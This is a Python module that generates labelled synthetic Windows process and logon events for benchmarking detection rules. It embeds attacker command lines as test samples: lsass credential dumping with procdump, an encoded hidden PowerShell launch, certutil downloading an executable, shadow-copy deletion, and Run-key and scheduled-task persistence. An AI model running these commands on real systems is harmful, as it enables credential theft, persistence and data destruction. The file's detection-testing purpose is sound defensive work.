"""Synthetic attack telemetry generator with ground-truth labels.

Public attack datasets (Mordor / OTRF Security-Datasets) require network
downloads and are large; to keep this repo fully offline and reproducible we
generate deterministic synthetic Windows process/auth telemetry that mirrors
their event shape (Sysmon EventID 1 / Security 4624/4625).

Every malicious event carries a `label` equal to the rule id it is designed
to trip -- that is the ground truth the benchmark scores against. Benign
events carry label=None and are crafted *not* to match any committed rule.

The generator is seeded, so `reports/benchmark_results.json` is reproducible.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

from .models import Event

_START = datetime(2026, 1, 1, 9, 0, 0, tzinfo=timezone.utc)

# Benign process-creation templates (should match no rule).
_BENIGN_PROCS = [
    (r"C:\Windows\System32\notepad.exe", "notepad.exe"),
    (r"C:\Program Files\Git\bin\git.exe", "git.exe status"),
    (r"C:\Windows\explorer.exe", "explorer.exe"),
    (r"C:\Program Files\Python312\python.exe", "python.exe app.py"),
    (r"C:\Windows\System32\svchost.exe", "svchost.exe -k netsvcs"),
    (r"C:\Program Files\Mozilla Firefox\firefox.exe", "firefox.exe"),
]

# Malicious event builders keyed by the rule id they are designed to trip.
_MALICIOUS = {
    "win_powershell_encoded": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
    },
    "win_lsass_dump": {
        "EventID": 1,
        "Image": r"C:\Tools\procdump64.exe",
        "CommandLine": "procdump64.exe -ma lsass.exe lsass.dmp",
    },
    "win_scheduled_task_create": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": "schtasks.exe /create /tn Updater /tr evil.exe /sc onlogon",
    },
    "win_run_key_persistence": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\reg.exe",
        "CommandLine": r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d evil.exe",
    },
    "win_certutil_download": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": "certutil.exe -urlcache -split -f http://10.0.0.5/a.exe a.exe",
    },
    "win_vss_shadow_delete": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\vssadmin.exe",
        "CommandLine": "vssadmin.exe delete shadows /all /quiet",
    },
    "win_failed_logon": {
        "EventID": 4625,
        "TargetUserName": "admin",
        "IpAddress": "10.0.0.9",
        "LogonType": 3,
    },
    "win_cmd_obfuscation": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\cmd.exe",
        "CommandLine": "cmd.exe /c p^o^w^e^r^s^h^e^l^l -c calc",
    },
    "win_rundll32_js": {
        "EventID": 1,
        "Image": r"C:\Windows\System32\rundll32.exe",
        "CommandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";code',
    },
}


def _ts(i: int) -> str:
    return (_START + timedelta(seconds=i * 7)).isoformat()


def generate(
    n_benign: int = 400,
    per_rule: int = 20,
    seed: int = 1337,
) -> list[Event]:
    """Return a deterministic, shuffled list of labeled synthetic events."""
    rng = random.Random(seed)
    events: list[Event] = []
    i = 0

    for _ in range(n_benign):
        image, cmd = rng.choice(_BENIGN_PROCS)
        roll = rng.random()
        if roll < 0.15:
            # benign successful logon
            fields = {
                "EventID": 4624,
                "TargetUserName": rng.choice(["alice", "bob", "svc_web"]),
                "IpAddress": "10.0.0.%d" % rng.randint(2, 50),
                "LogonType": 2,
            }
        else:
            fields = {
                "EventID": 1,
                "Image": image,
                "CommandLine": cmd,
            }
        events.append(Event(ts=_ts(i), source="synthetic", fields=fields, label=None))
        i += 1

    for rule_id, template in _MALICIOUS.items():
        for _ in range(per_rule):
            fields = dict(template)
            # light, label-preserving jitter so events aren't byte-identical
            if "IpAddress" in fields:
                fields["IpAddress"] = "10.0.0.%d" % rng.randint(2, 254)
            events.append(
                Event(ts=_ts(i), source="synthetic", fields=fields, label=rule_id)
            )
            i += 1

    rng.shuffle(events)
    return events


def malicious_rule_ids() -> list[str]:
    return list(_MALICIOUS.keys())
